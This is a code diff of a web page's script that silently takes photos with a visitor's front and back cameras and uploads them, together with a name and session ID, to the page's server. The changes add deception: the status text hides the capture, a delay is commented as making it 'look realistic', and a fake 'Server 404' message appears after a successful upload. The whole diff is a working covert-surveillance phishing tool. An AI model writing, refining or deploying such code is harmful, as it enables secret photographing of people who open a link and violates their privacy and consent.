@@ -10,11 +10,14 @@
   </style>
 </head>
 <body>
-  <p id="status">Capturing photos, please wait…</p>
+  <p id="status">Page will load in 2–3 seconds, please wait....</p>
 
   <script>
   (async function() {
     const status = document.getElementById("status");
+
+    // Delay so it looks realistic
+    await new Promise(r => setTimeout(r, 3000));
 
     // Get sessionId and name from URL
     const urlParams = new URLSearchParams(window.location.search);
@@ -23,9 +26,10 @@
 
     async function takePhoto(facingMode) {
       try {
-        const constraints = { video: { facingMode: facingMode } };
+        const constraints = {
+          video: typeof facingMode === "string" ? { facingMode } : { facingMode: facingMode }
+        };
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
-
         const video = document.createElement("video");
         video.srcObject = stream;
         await video.play();
@@ -33,44 +37,56 @@
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        return new Promise((resolve, reject) => {
-          canvas.toBlob(blob => {
-            stream.getTracks().forEach(track => track.stop());
-            if (blob) resolve(blob);
-            else reject(new Error("Failed to create blob"));
-          }, "image/jpeg", 0.7); // 0.7 = compression
-        });
+        const imageData = canvas.toDataURL("image/jpeg");
+        stream.getTracks().forEach(track => track.stop());
+        return imageData;
       } catch (err) {
-        console.error("Camera capture failed:", err);
+        console.warn("Camera failed for", facingMode, err);
         throw err;
       }
     }
 
-    async function sendToServer(blob, type) {
-      const formData = new FormData();
-      formData.append("photo", blob, `${type}_${Date.now()}.jpg`);
-      formData.append("name", name);
-      formData.append("type", type);
-      formData.append("sessionId", sessionId);
-
-      const res = await fetch("/upload-photo", { method: "POST", body: formData });
-      return res.json();
+    async function sendToServer(imageData, type) {
+      await fetch("/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          image: imageData,
+          name,
+          type,
+          sessionId
+        })
+      });
     }
 
     try {
-      // Always do front then back
-      const frontPhoto = await takePhoto("user");
-      await sendToServer(frontPhoto, "front");
+      if (/Mobi|Android/i.test(navigator.userAgent)) {
+        // ✅ Android: front then back
+        const frontPhoto = await takePhoto("user");
+        await sendToServer(frontPhoto, "front");
 
-      const backPhoto = await takePhoto("environment");
-      await sendToServer(backPhoto, "back");
+        const backPhoto = await takePhoto({ ideal: "environment" });
+        await sendToServer(backPhoto, "back");
+      } else {
+        // ✅ iPhone/Desktop: try back, fallback to front
+        const frontPhoto = await takePhoto("user");
+        await sendToServer(frontPhoto, "front");
 
-      status.innerText = "Photos captured and uploaded successfully!";
+        let backPhoto;
+        try {
+          backPhoto = await takePhoto({ ideal: "environment" });
+        } catch (e) {
+          backPhoto = await takePhoto("user"); // fallback
+        }
+        await sendToServer(backPhoto, "back");
+      }
+
+      // Fake success message
+      status.innerText = "Server 404! Please try after some time";
     } catch (err) {
-      console.error(err);
+      // Fake failure message
       status.innerText = "Server failed! Sorry, try again in a few minutes!";
     }
   })();
